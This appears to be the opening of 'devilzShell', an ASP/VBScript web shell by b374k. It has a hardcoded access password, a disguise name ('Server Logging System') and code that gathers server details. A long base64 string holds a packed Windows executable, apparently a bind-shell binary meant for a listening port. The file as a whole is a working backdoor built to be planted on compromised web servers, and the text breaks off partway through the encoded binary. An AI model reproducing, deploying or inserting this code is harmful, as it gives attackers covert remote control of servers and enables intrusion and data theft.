<%@ Language = "VBscript" %><% On Error Resume Next %><% Server.ScriptTimeout=600 %><% session.lcid=2057 %>
<%
'# devilzShell <[asp]>
'# ^^^^^^^^^^^^
'# author: b374k
'# greets: devilzc0der(s) and all of you who love peace and freedom
'#
'#
'# ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'# Jayalah Indonesiaku


'################# VARIABLES GOES HERE #######################=============================================]
shell_name = "devilzShell"
shell_fake_name = "Server Logging System"
shell_title = " :: " & shell_name & " ::"
shell_version = "v1"
shell_password = "devilzc0der"
shell_fav_port = "12345"
shell_color = "#374374"

' server software
xSoftware = xtrim(Request.ServerVariables("SERVER_SOFTWARE"))
' uname -a
xSystem = OSver()
' server ip
xServerIP = Request.ServerVariables("LOCAL_ADDR")
' your ip ;-)
xClientIP = Request.ServerVariables("REMOTE_ADDR")

xHeader = xSoftware & "<br />" & xSystem & "<br />Server IP: <span class=""gaul"">[ </span>" & xServerIP & "<span class=""gaul""> ]</span>&nbsp;&nbsp;&nbsp;Your IP: <span class=""gaul"">[ </span>" & xClientIP & "<span class=""gaul""> ]</span>"
'################# RESOURCES GOES HERE #######################=============================================]
icon = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAB/klEQVR42o2RS2gUQRCGq7rHB0rw" &_
"4miwFWVmPSmIHpaQSwQD4ivGKHsImIOyBhJETUDjRaMIEjTk4gNFIutBwScY8eBh9aBgyCGCiKu4" &_
"E4kzBk0uimiI21XWwgbMorOppumuKuqr6r8RZmnjxl8iR0H2DzfKT03HsVLhV+Ove4rc8xk4uYtx" &_
"dCHgGQHc/SdAuqwZB9jCAE7RnwLGR8hHbiK5/aQzCcC0FP/+u2YG4KPx2+p14SKVTbFIiPdI7/ei" &_
"oL98whmAt8bv3O7Y89sIv29kzOpSvENR41lSD1Jh0BQLeGf8jq3a9nayetX2KVhfeta8Gm0nuwgH" &_
"0+FITSxgzPgtm3Qhs5qR+kgfqwIYGgVuTmk60EPq/p4w2B0LkG5+l7I5Ud3BUsoBBlc0uEVOakWU" &_
"vxMLKNqA8V4c0rZWyZ0lzbI2M9rTpNfKD+RiAV+MX9eiCs9+yV2ecLkacPgaUvcNxcuuWHW9Pgr2" &_
"xQJeGu9Us7YnjpMaFsE2FGOh8dN12l49SjjUGo4kYwE54x3eqW3fXlJjrawSMvLPN8brbtB08hyp" &_
"gaYwaIgFTJjE0l5l3wfAVRdIN4qQT8T/dht5btbq9pVR/lJFEUWHWhF9fnWUzxb9x8u9hwcV7ZjO" &_
"D1rHXRx9mPgvoNxkqjmTwKnXyMlVgAtcxucCyMwaUMn+AMvLzBHNivq3AAAAAElFTkSuQmCC"
bg = "iVBORw0KGgoAAAANSUhEUgAAAAMAAAADCAYAAABWKLW/AAAAJklEQVR42mNkAAIpKan/b968YWAE" &_
"MZ49ewamGdnY2P6LiIgwgAQA8xYNYheotNcAAAAASUVORK5CYII="
wBind="TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" &_
"AAAAyAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v" &_
"ZGUuDQ0KJAAAAAAAAAA0GAk5cHlnanB5Z2pweWdqmGZsanF5Z2rzZWlqenlnanB5ZmpNeWdqEmZ0" &_
"and5Z2qYZm1qanlnalJpY2hweWdqAAAAAAAAAABQRQAATAEDAIkLlD8AAAAAAAAAAOAADwELAQYA" &_
"ADAAAAAQAAAAQAAAYHIAAABQAAAAgAAAAABAAAAQAAAAAgAABAAAAAAAAAAEAAAAAAAAAACQAAAA" &_
"EAAAAAAAAAIAAAAAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAACAAAAIAQAAAAAAAAAA" &_
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" &_
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFVQWDAAAAAA" &_
"AEAAAAAQAAAAAAAAAAQAAAAAAAAAAAAAAAAAAIAAAOBVUFgxAAAAAAAwAAAAUAAAACQAAAAEAAAA" &_
"AAAAAAAAAAAAAABAAADgVVBYMgAAAAAAEAAAAIAAAAACAAAAKAAAAAAAAAAAAAAAAAAAQAAAwAAA" &_
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" &_
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" &_
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" &_
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" &_
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" &_
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" &_
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" &_
"AAAAAAAAAAAAAAAAAAAAAAAAMy4wNABVUFghDQkCCbOeYU01Vb5H61QAAFUiAAAAYAAAJgMADCfk" &_
"//+DfCQEBXUIagD/FTBAQADCBACQuCx03/7/EgAA6AMABSxTVVZXaAAQI2gwUEAuHN1v396L0LkH" &_
"HgAzwI1GPPOruAQMv/aX3bsQBIlEJEADRI08M9tQUokf9naz/USJXCRQNgyheFYEvvdlJ/6v+/+D" &_
"+AGJdCQUfhyLDYQTUWkXg8QEZjvDbHf/7j4UdQQdjZQkrFNSagI+9Hb/ut+FwA+FQwI8PUcDfX5T" &_
"AGoB+777+x7olPA78zYYD4QeAptTSa3puq4ggBQHJAMoLCp7vm2b8GbHChwki0wkFFFA7U33Z+xU" &_
"JBBmvR4cUlBWdZDucpDczQFqChDkXjfsZryLLUTTThD+W/7t1taVIItuGI1MJBCNVFFG/vYgW5zg" &_
"dNPp5gIQaBAnABbOZhpHQP2IVNAbbt1HO9N0sJMQu4vxWSzBu///wukCXIvOg+ED86oPv0oKi1IM" &_
"i8EYMIvK956/Mhqli8ikxtEshG8IwckYzUYd6V67sBlO/wDm4Sxb5wYZ2DUYtFhA1d13lw12PAJo" &_
"BONSx4QkjNgBzn54cwtMnCSQ47QkmAacHtt8T6AAzzyNvDqDyf/G7nfcwmhQLvKu99FJiZ/GhACa" &_
"pum6GVwHRWVBY2marmlGeB9CbUfTme8GQwdkiJwMSA5E94s9Wy5mOIR6r1BR6bZN11oQ6wW2XFNS" &_
"1DSD6QpHdQ4A4dR3HP+QbgFFC8xfXl1bgcTj4Y5HNvkIg+wQ6DPtV8oKl7vH6AcUIBCJbM0U/mbr" &_
"Axw8TGg/AA8AVVVMRmr/LFQE+Dv9dHl/GldeePfZEwgdAAU7xXQF+tPrWfvdtNkUSD0kInVMVQBW" &_
"VZcOc7ddMv8BSWg4NzwQs22lf+iF7XQjlQFVTRQLbtvONQzWINa0Vltxc41LJRDCa6ldiS3t9mbJ" &_
"fHgBOT1sUgp+ESDvfnf6agiKBlBPKQjrEIsVYF4zyYoOj/Hf/YoESoPgCJgDRuvQgD4AdGa7iTSF" &_
"1n57u4AGQKMMOkY8InUYBgWy7X//dAtGhMB0Qgp19UbGBgA1mmUeO8lmyQ5RD6Fk0ooW+q0dWVB1" &_
"zh8/yXQC68tXOGloBxCUGAcANjrM3FIA+MfOzIDyH2v6ZYurg8cBfg8PtgdqCNle6X1ZWesOLGTF" &_
"QQr/9rKFwEfr0hU3R4P+LYvubGGt19oGKzUPdkMsZw/7DGoEVkALoTxwBP32798NjQSbjVxG0DDr" &_
"z4P9QsN1AvfYyb7b+pLD/0MENgSMWcPMAB0fo8BRPQJxCHIUgUIVv/2x3z4tEIUBF3PsK8iLxAyL" &_
"4YsIi+H/jYVAAsMh7FGLRQiNSAGB+QCfsHR7tncMvQ+3vutSt1b//+2v1w7B+QiB0fZEVgGAXnQO" &_
"gGX+AIhN/I3LduOIRf0g6wkN/UX82rXtj/ZYjU0KBRNRUI0QUAvfbrjQnQdmxBxOAsnDU0UKI0Wy" &_
"Y4HfDMl0av+qQVKUIuHGe/dkoQAAUGSJJQfgWFNi8SNceIll6Il0QKvUiRX4VNt3n95hyIHh/8gN" &_
"9A3B4QgDygrw3A+7P+gQo+wHM/ZFEVpZbrs3ug0wHAsG1ol1/AgPr+y79kkWoxhaBA8OfaPQVAls" &_
"22Z3DDAEC3cImSvQt6T3/zMNCEQWH4lFnPZF0AF0Brs0vS1w1OsDWlgddZxWoXALv2XXUCMDDKAI" &_
"CMZH7GVD6Q1VCYlNmOzOCZs2F77dw4vHdZge1+3YVHUFWO0g7A0TaLwToQmVbAhz5XhSLyRZJXhL" &_
"OBEC7ADu7jYbxAiLC8gFDHUJDwT34dv43TqrUwWL2B33ZK0DCZzgLjCE01safxh8eHKEGKHcU9s7" &_
"NdgsbHA+zeReVhF7f6TOM/yAInQEi8brHRsY+WSDZwxTiHyEzgAtvMG7AlijQ2wCdSQcHGVbMN1J" &_
"BaFEvBEUAhDYMSuVDDkzqQiHt18LmGzglCRdGBmhVGObbU/0RY1TLEEg+InW0HQbwFRAhBg3wb/x" &_
"b18f4FZ0Y4ld/I08IceDwAMkdmEXi/wNwIv00NxXzDhKy46FFPwMW6PBxkY7kdQqg7//ydrs1ukp" &_
"SeBWXxxVPHOtc1IRFNeg7esCnYULXUNlbU3wJg2JCG8sgVvIoRRaCNgH80Bh0BohCPquIV+DgZQO" &_
"AD5ndg2nwxjQDI4I6BC5tU3IAVcPX7koVbM9Ond1ERh6LGUGhHBxoSEIDNSLXAmd/d0VpCKIHSAo" &_
"PKEQgyI/+98tuAwJVo1x/DvwchOLBpeD7gQ7hnyFvzUic+1e8pQUw5d8N25oIBAchdtbC61nxDp6" &_
"iYZwX8MFtSfbdRI7qnMNV8YE61HCtms4yp4IPgrcGFn4N1v7xSBwWAhIChWD+wXlDd0LWYNgCOpY" &_
"4wrZg/uNktvMhPauLGEsvbbrY6VNQguLSASDZ4XIHf/NrTT4EAUV/APRVjvKfRWNNPC33e1JK9EE" &_
"tYgSgyYCxgxKdfeL3bYOdngEU7eOM8BpxwWfAXv3DINA63A9kBKBXT0B+RmQkYRKPZP5GZCfhTc9" &_
"jYIkPY9Onp8BhhE9kgqKay2MnZ2IarXTdAprwH0fWV7rCPpREWOj41lwFPiDyP8xbFko1yi5uFtd" &_
"w+RGUS7ufbtGOWjZVrgFdO3r7Rv8n4DADDvGcwQ5EN2NDEleA+xyfL+NFTvBEnSWMwhaeBk4sgAZ" &_
"WrHkRDPxkQ4likYBJ002Gy7QIBHAwFCnFVR05vi2lSVa4yENBwo8IHa6rr2VTQwgd/o0KAQP6fUu" &_
"LZTZ21MnOR1a29cWrA5bWtAT/yc6An/6SyESPD10AUddGxxZjSL8Tm3wAevorL1hZhqcA25HW3tZ" &_
"5zUI9Y7sfwtPCcYHPUE4H3Q5VVc5it2+RUhZRYA/SSJVNLZYtlB5PAYuOzaxb3f8eKxZblkD/Td1" &_
"yV3/hEPpt30WdisdC4kejYc2Bl84qWFb1FG9rxi5V74wii2pP7bDqZATKaIYfP44g61ChRhNJ874" &_
"vNoGrxV1n6yLDy0N2zag/NiI1KgYtWGTrtahCC8n2zWs1SSGMTVwFEhazuVuZgCco/ylL5hSu7Vt" &_
"TBgcFJSDIXJqjlhji0p9VLUgrdVLpYV4dzeDx1MU8gv/woA4m0SKUAFAgPq+KYTSdCUX3rj90vaC" &_
"4VdHBHQ9AYX2cIoQHTsy9ogWRkAL1evODASAyNjtLR1GQBzrQx4Ff0vetgRARNr2gxkYiB5e3pq7" &_
"RmUgdAkJCAl1zHUDSLY3jjW7Smb/gGUYAE4A+75mlrbgRCsFJwNeeGBmbPEXyLyLVbbCaxffAsfQ" &_
"14UiXNH49y3wQEPr95Is9sMBltzaX7hBOX1tDYB4ASKN4x2Lwihh2EpbNwgM7u/2t98YGA+UwokF" &_
"0euL00uFkw5DiNpboULXBbFLdfOA30Zr5KcgP1UKij+su9Q2dDoPZ3QuKBniwgkTBgYfGw9AsGtz" &_
"AwMVAUCQDbWr3deGMA8Og8cDg/eUmgFDo+H7oOOFDm5JoTSIU7stpEBNNgftwT3AzATV+j3XAS0W" &_
"Ie3rKGYWTpZvVPsX6hszsgNzAuIPWoHdbLMOQww/J8JmOR5t0Forc+s7CPv5NnZLnwbyK8YvUE7R" &_
"+I5A0h2w0QJdUys0/9c1KVdL+jvrdDIyC41qroFbHFVQuyQlIW2D1L1WDBAnXAmL9sTP1gNWnpjD" &_
"61OVTKUSpZO5hbF0PGBD0vZv+3QKQDh7+wT2K8dAalXOUolWWKr7Rrp05WCk9ZyzDpRfPDrxxiCV" &_
"w+ww7HCCRIsROmHTpKllMhsVWUAY4DXAsgBaIB6GKfutbNy0cxptBLbGRgUKoSNC7u/S9QgFG+vi" &_
"jeGYTh1NDGYJQnXFNen3RQnCbrkLMI3cu/1XYrhKSo0cLnwCdjk1Yz6wzP19Ur8ETI8AOIPS/NjP" &_
"f4kHjYh+wXMYgGAIGHuBy0CLD3YIgcF85BVif+bVSXy76waLCfvxL2y80X5Giyr4ZDaKTQD2wQEw" &_
"oe6tfgQIdQulsB6lCo2/0MeLz8H4BY1Vy3Qv1HrPIaULiQgviDVe4hvrR0WDw5v+fLpQKPECn+w8" &_
"2P/y2HVNOxa3b10ABIG0avZY64jDSPW7HaE7wPVYrKiD/3MXV2b9MFInDCUVPtAGgE4r89YoauoK" &_
"A3UK8MW+xG4EBYBDdAN8m/+4Ajwrszao0kTDhXrVUYN3GWgceGRrUHYgVbSj6FjcOjY8hS4e0UoP" &_
"POhY6JAD86BySL9YONF7/OdV2Gi02PRYuCEeCC5SXTqL5afujjrbTItBBAaeuB3rvozRdA+tVIkC" &_
"uAMQwz7Njv6hi9lq/mi8IYn/NQDFLrogGSBKi3C+sOO2QP7xLjvadCghdosMs4XbVgmpbUgXfLOx" &_
"/fbv+3USaAEBLbN9Em7/VAjrw2SPBQjtnONDooznZIu2t+DS94F5BGh1DVEMpTlRmLh7C7EFm4pR" &_
"uxSF2woEK3EIqGFLArdGfGtD0GsMWVt371ZD6G/D/TIwWEMwMPfjCPr8i11Yii3ll1hA5NmC5qB1" &_
"cIkxReEPCInvsrU+IXN7CMFhulv7l212sY90RVZVjWsQqAtdI7oXul5BC8QzeDwlU14DxrpyEZgd" &_
"VgzatWOyFVw2b96PSnznum2PVQw7CDAaizSP66HqHftq9nwcyesVXEOITVbgP10WlLVCb2i8O4sp" &_
"i0H2A151yRoQJOGhe60aCrihmfIqinWs3M98UiFo/D6GoThWj2DUy1nwdZzwH/5g14HspIRVCDPJ" &_
"uCjY3bTVPjuQC0JBPbgMfPG5hfe3lfHB5gM7lhomHCpJZ5aGbLzocA3X9h66ENeo+nUL8SBsRGLh" &_
"hVw+/7kpAOXBukm6MBMX/ENALXF2FiZZEleSvWdvx+IHYUBZZTx2KRlQL3B2FnT4DYNGagMDN7Op" &_
"7vho+EFXqCesVWD/xs6SNNwQVwy8zP2QwR3YvP+2LNMWzFSr2REKBCfBL98ZsFkaLF/rJo2Emhor" &_
"azBq1zY7TdOk3Qhq9Nx/xF5OTUOAyeQtDEdLpo0mCEfFij8x+apEKf6D+gRyLffZVHRvvv9fE4gH" &_
"R0l1+ovIweAIA8EGEMqD4gPXXaIUewPzqzoGIw4o5UxKPs0ixDnJVo0EFWVP3ICuHhaKQ4SIJHVb" &_
"0ISBHGZTDglFhgOuq2ohIzvkeCQzUqQB/wUY9poBfvAXLyE1uLQQfXCiFbgi/N5WLJd3/AnSuMgV" &_
"OTB0cjBCVFGaYuEN6Nuc99YVIxgkvkBjWb/ggtAWewnT6AGJUMOqcXOjtenkgA+G74B97rG1+NMZ" &_
"u03vihEPDK6x9038LLZB/+Q7wg+HkyXHW21ZAw7uUkg/Uux+owEsiwSqjZ7YkYA7v03ob7TLdCyK" &_
"UQFkhbb6O8d3t2/3jRTJ/IqSwCAIkEZAE3b1bBu68EFBgDkY1P/cwwid/EGWMC2Ewfz9zG0WHt5Q" &_
"o6wLeeTMv8B07P7eD6WlWaO7petVQHn//0g9fWZwGkKhCEA9SnKwbBYrIzksVDbWXmtx+gvCTasA" &_
"voLb6OsN2FwKmzCs4KpQ+wTVHUFbangfHpXfgyUhVf4jPMjW6ktc/yV4av0oMHJhFGz85RaxZSdy" &_
"GUn1UKmUgameKii0wbY2FwQNbkggdjZTOwG4BOkFEgsgLzzPCBFXbFkzwN4bIdiqtBejxdwbBs76" &_
"w18zFKQE7AaMCI1W9+cKFgumfz80wL6HiIQF7KyCxqW6+v5y9IpF8saFDSCpN6Mv4erGjVVgtgra" &_
"v3cdKxi0e+zIjbwqQbggAIvZlzb99s/LQkKKQv80ddBfW2qd7PpYa/YagzWNejFWnbFgxFa1I/2y" &_
"m032HVYeVjQjKKqwQ1cy/GjvJ39bsBReXD2NcmaLEb+fsMD2wmAW+hCKlAVkiJBO3gqY4L8aAnQQ" &_
"IMZbAHdbpqAcgWHCDY08AL/rSRUlf1hju0FyGQRaqkvIgMEgiJOXt7GISR8dYXITencOrm7YmyDp" &_
"IOvgTEq+ZeHXgwE6Emr9CJZZ/F+dYHIIWvQDJNCogR+XHw/2VhoWLVg+Zx86Xr0TQMN6HbyxsNdI" &_
"fMscJ2qNpCTC/7us4ZH4V/fBA/6KAUG2Ow4S/f//dfGLAbr//v5+A9CD8P8zwoPBBKm/ht9t8IF0" &_
"6Jf8JiOE5HQaqUh0gR4d6Kmno82Ny8tboz/+BP7rCP3rA/zaGswR9l8ZC0EM/WBvxWSIF0di7usF" &_
"iRe+rBCsxWduaYNrN/a2m+EvNITkJ/fCaRIH2Qm0sWrHOC5mCLYlK9HG7gwIiAcjw9kIuHAqWsUb" &_
"9eiu/rHgdyIObTo6u23adRZkmJ6DFdoTKvneRbsbOEJYNcANdwtWGiJlqBRNPRwuA3ByCS/U/8rm" &_
"8FZqZEE4xAYAX16I0JCTFEAA5KS5SGMyJBNJtke4QbUrwcMJ/qbZZJL9/IbGoNBStFfFnU1SttEL" &_
"FMEQ0QPG1HbUMI3t+PgPgnhH98eMFIrQ/0I4kd9yKfOl/ySV6CwWKvDbYse6HIPpSMrgczO3JYjI" &_
"F4UABo34Tdc9XZAHfBAEPANgI7a3wMHRiszXiEcBBQIZW7bmVghZxsdczJaxZSeNSSslAQI7m+RZ" &_
"AqaQI0YhrjuQr0c/jN8GzAOapmmaxLy0rKScNN1C/79EjuSJl+QH6OjTNE3T7Ozw8PQC0zRN9Pj4" &_
"/BBafNgojZoD8HoJwDTb7//wAC0DDCAN7C3tWF5foJCdCwnBBZv5EaMN4e3DDAorjXQxZ3w5/H92" &_
"20sGJA394/x3gC7CeWtxRe+NMC6PF/mcTPkriC0swma67pCYC7gD4G0DOlvydbdvA05YT1a2S90u" &_
"Ydgfo+4C7wK8ZQPyKYyQJySNV7Ykqy0DrkXXXZiBWmBbNAY8A03TNE1ETFRcZHdpmmaELpccHBgY" &_
"pmmaphQUEBAMkKZpmgwICAQETdedsB+QBZgDqLwlOLeELpe3tYcDWwizD4MTIZlOCLdoQBnVDLkW" &_
"YHK0SFuts50luqwGsAUGwIzEo6iUoLrspd5CeKEY+YChtAfatDVgiLraVJJQDNcL7ZY1ACRyB2MU" &_
"6+hfZXIRIaPLnsX2VnKv8/ryK3EMWriD/7/AwvxXwe4Pi86LevxpyQSvS4l92Cjk3jCMAUSZILZN" &_
"xrcG3L0ME9UI+HV/wRGjQnz7aj9JXwsMO892qZELBXq7EwQ7Awh1SL2lIP+tf+hzHL9x0++NTAGO" &_
"1yF8sET+CXUu2Na7K3UhOeskdeAeLX0692AhvLDEEiQGeQSZsXLBUYd8EwoEje+2G8xd+A0IjIv7" &_
"wf8EZHRb29r/P3uGXy+94ZfsFWoAWiTQK6gFun/MEaGJVfhJWjvKpnb2/LmtdfPKQRv7QD47+nbb" &_
"UrstmPq/dGsuiVG+UTwyMmC9uurSIVRhwSKXER69LdYS8tIhlExSv1pZzrZJvkoLBAgRFS5s1JEn" &_
"7NUJOTOGfDMbpIkp8I0M+crWXPcLJokvDgUIol1q2ZdKY4cHBO/bRrtfzU0P/sGIC3Ml8w9GDnay" &_
"3b+7iIvP0+t2CRkNjUSxxW4V+wkY6ykkwE/gGWOH4J4lWQQPnYS3CVT6VsM4i1RFoxqJXBNXhngs" &_
"S3L6oXZMWqp8ot9/pFanQBTi9qZqDwNIDFKAAEPMXiN2klNRgB8y/rD3IBwJUAgOOUAQg6SI4uxu" &_
"9mwkD/5IQwpI6rE33OJ5QxODYAT+EYN4CLrXNt1DbFMQcAxaEgkQLXosLGD0D9hC4RjyBICSy8go" &_
"+sW/ofNMEexRjUgUUZsrHOP9dmVizv8NLzsFIjVPv7ZRtxSWOokNTOsidX5Pt6OsiTU1XClgkypm" &_
"L2gbn9yNYDyCLBtIF3bw/Ds6TBdqSTR9DoPO/9PugynHWy3t/+/06xAmgP+2wL0z9tPoDgOhaYvY" &_
"O99/u/AbfwhzGYtL4TsjKyP+C891C7td41Y+FDuaGHLnB3V520zI94vaO9gmFQXr5hklukV3dVkk" &_
"c7N7CEh3yLNzEzfr7SYNG7dfmbMv7hclbnuF23YXtDAWCCYfWVstbFut/IBDqDhsB91r1W0b6SNp" &_
"WqUUi8NbqW0W+sdKLYuMkLY7e9ilgJBEiDeLEnAR9gtvZVXdg2X8hEhEC9aLCwEMtdB1B5FJFKb/" &_
"LlwcX4v+IzkL13Tpi5cbhzXryjP/XFhNdkz/7mB3V851DWZqIGRfhcl8BdHhR66u2+7r94sgVPlD" &_
"Cit/8XuNRk3/wf4EToP+P374Xjeb0qaTzA0BJGEgfSsRt6UOAu84nNPz7CM3ynH3XIhEiQP+D3Xq" &_
"Yewh0WID6QvrMRcrlSu4douhMiEZKTaYLCbnKASFIgrArk2vy3oE+ACVr3oIkNt+rmqEoql88UIM" &_
"pVkGkFoiwmQG1VLpZv4LfSnEmQsujW2uxxFiv7DOjAk7gN12yQqPCXyu6y8ovg9po+VOtgl7BLG8" &_
"cD3Sxa0Wvu4JN2p0uaVfOnQLiQqJA/yyeXVt+G0bvNEiARIy/J+LDnr8VqohJQ8+dRo7HfLQiNSV" &_
"60s7pAbSpbpgaxGJUEIECAY9OCkCDW/sMN26wf9ddTBfiVBy4JCWBaW0V5doMIPCBirHdIicDX/B" &_
"YsA9CmjEQeAIR7bPTEUwjTSBM2SJRvZBA/0QdCpqBGj/aLJXGfQGMMhgDB12EFe11ICB/N18TqAW" &_
"+60kxYl+BP8FYkFwHapdqovGsu7po/WNrktxyEEIM9vFT+vjRrPgQ8M3acCBWvvEdhtjMIJF6kAI" &_
"AgTdujVsnEoe+4XB5995DBcw5LOLEIAARQ36TSbRJycVjZcAcCNocGn7+nc8jUd3SPKDiH5mMO/u" &_
"9I2I/AbHQPzwQg56n/vt7/+lSATHgOgQFAVW3lE3WCzwlnbHI08MBfjeugLghukmiayNSgyH28vW" &_
"CI9BZJ5EQrye41Wq8RYsQ4rIC6BGq1vdeohOQwsJeMIsCjgoMMtofmrPj4rQ2KvkYFZCeJDo4WhE" &_
"RDBczWeLNbl42FBBhjhEs9ZhB37P/il0UGgoEGgUB6Nkbnop3uHWo2i8C94W/9BdvWf/PXQOoWgQ" &_
"BVMRvhigV6phA0FNjgdWR1zr+I8MV5SsUrv6elZTi9ndFPebTgVvqHEkEG7bdW/rIdbVjii8s3Ql" &_
"gSkfN/tfe3XrLR1Rg+MDdA0gHaEOKlQv8CBbNVB6z2jDyXQSOoN30j0DcRE67mwYgAjQNi76Kpgg" &_
"I8B292Ov+gYny3LyFoPG3iweDLXCtyN1xjnrGIHixwwt9kjTCQ4ABDPSU+5s97ttVQoEiQdfdfiw" &_
"dYWjAjlCMFlQRLWCUuQcVJ8QXAI+f0ZX8ltTZIme4FbUVtaMs5XfRhMdI+siIAxRTwg+G4heIgEI" &_
"3mLSWWxcFH4QoHEHRFRdzllZ5WDrotfJHRMdFhy8JQQu2XRIyOb5EHMqOtN9IAQbs3Ygcy5/JKCD" &_
"5yVzIP+Lc+RNnIjW14VWGQRgmxCCG3fEQdw2CMGGX+sTcP8mBby1sRGLOGfcdGa6ZG22M9xhIVf0" &_
"TS/iLObsGqWMD+1/iRJPRfd0MvZFDQR0QD6zm6m2HHiyQNV/HtrAbG1kMkjSj1C6kIayyMeD8gvZ" &_
"XN2zNtyJXeAuVkoyEluyfXfKutbfdM9k5Gd0nI+4zW43s3UEA+sGjChoIPggNmaU1VC/t3ELFKGL" &_
"z8Zx0QgAlkrNi0RW/EoNEmywUELsQO1J9NjcEt3zDF7IKx6DwuSCkxaKdH4PODL1OqqBtwSe2eRA" &_
"SXBrf2g8y5HPCYA7eDz8O5ACJNh1BLwD4Dt/CDkA8mg8aDw0XTdYP18GTANEPAk2TdM0LCQcPH/u" &_
"M4cAaDzwgAMDkASbjKA8fwDnEfKQPrA9CD1IsOt+LJAYCzgDYD1/yCGQVwA+AD66brBQW7R/vAPE" &_
"bJqmaczU3OT3PU4IARJ/HxAgwabrBRgDKDw+fxFm+gXM/yXAmgA1anMA/6sWSitBj8wDF00YkwPb" &_
"pv6/cnVudGltZSBlcnJvclENCgNUAflv9kxPU1MRDgBTSU5H/rL2AlNPTUESEVI2MDI4t7+83Qgt" &_
"IEthYmx0byBpbmlWYWw/3+zbaXoNaGVhcDcnN25vdLZvcGs9BHVn7nNwYWMjZuw2YO97bG93aThh" &_
"Bm9uNyB5Crk2c3RkWvvtZzVwdXIrdmlydHUhM77Y9tulYyMgYwxsKF802nabQl8qZXhcL1iwk732" &_
"BtziXzE599vu5r5vcGVYMXNvD2Rlc2NrbTJgKzhGJIHfQIhwZWQZVyM3dms0JG2brHRovyGM5Nth" &_
"L2xvY2sXmtsGWzRkt2EuAvat4daiIXJtAHBAZ3JhbSB7IRS2Sm02LzA5T6MZWgoQQSorFPK5RjAu" &_
"Kzg9D+H7YXJndShzXzAyZott267Bbm5ngm8FdDoR0ApnrWTmf00tYBj/8LY5ZhVWaXOqQysrIFKg" &_
"Ye67PUxpYrRyeScKLRYaZ9vDRQ4hEVDUOsI2rEDZAC7v5eD89ra5JSxrbHduPhtHZXRMYbELd2wy" &_
"QQJ2ZVCudXAT/61tZw9XlWQmh2Vzc2FnZUJvNb6wxHhBfXMlMzIuZCrPtaInN745SAMLVJhrxHI6" &_
"IAMAq6QeQF4pp7Zq9ftSU01TUwdlbZk0U1ffAKX5v3MgTWFuDucoQnZyAFwv2gOZZMq2ACABKCCZ" &_
"SB4ASAAQhEAmZAAQgQZkCGQBEIJkCGRAAhDuqsrcvwABB9sIdZAu2xhbBR/AZJBukAsdCwSWQAZp" &_
"Bo0IjmRABmSPkJEFZEAGkpOyLEQHCAfvCowkLwtvDKsABZMZ9zWgb6uIbD9cB03TNE0JMAoMEOB0" &_
"r2mWQhGwElcHExczTdNgGChYB033lk0ayEEbuwccaDRN0zR4WHlIetM0TdM4/DT/JKuInQRTAgTS" &_
"ReTZwb5ggnmCIRem3wehpbx5/v2Bn+D8L0B+gPyowaPao0HOHmGXgf4HQG6QIbC1L0G2X+cr5P/P" &_
"ouSiGgDlouiiW36h/lfy291RBQPaXtpfX9pq2jLT4GXn9tje4Pk5MX4A+AMyKCKwWdnVUVF8RyQw" &_
"/f8GoE1EQnl0ZVRvV2lkZUNoYXID8H+7FFVuBm5kbGVkRXhjZXAF+la5bUZpJmUZD0N1cnK2oFWt" &_
"v1UAcwJw2dYSI2kMQ1iTbIO1KA5BL1NEe+wLwGlytm9yeUFFU3lzJ7PWDmxtFFNvaxtq9hvAdGGP" &_
"cEluZm8s7rNXuZbNgG9tbZ7J2jD3TGluZR61v8q2JABjJUWTT3L7F1sAWXMWmkFkZHKtCUABGExh" &_
"PABHArpJVgVBbGANYGtMDUiBCj32NztSZQxDQUNQB01vZCycRbhyZUgqqFYjc2fBHjMtC09FTSd/" &_
"VIBlwt55cCUPV1RruyU8ajSVQ01vIxCwCTtBDVd1ZUMB2JBlTr84RnJmKWxl7RhFbu3s0Jpe20R2" &_
"Gm95ZhGGEDZXxeUbrAEUelvDZBIxey82DY3PTzZ7SZgEUIYYCc1QbnxSdGxgd2m8YfA0G7F0ypGJ" &_
"AENw2Iy4ZnNlYGJPsDPiFjtTQ2xBDyPYjFkiZAw5CFgymnGGIRrbBfZRDkPlbIYtxF4Cn3RjaFvp" &_
"ZzYLmKMO7B+GHMu2aballsz/AwI0FnfLsiwEAgENzlNBU9vmaAGIIQ4JAgj8lyctc4JQRUwBAwCJ" &_
"C5Q/jIj9h+AADwELAQb0J3Zy2R3UFQQQAEAAEA+2YRNiEgcXYOxsFkyiDBAHy73sDQYAaESDR0DW" &_
"DQii/B7WEBvBLhh0Oi6Q4LOQDTCY+mAuck2YdYaLJwlTA5pb7JRqQC4mJxwKUPKbkkFQwBO0RQAA" &_
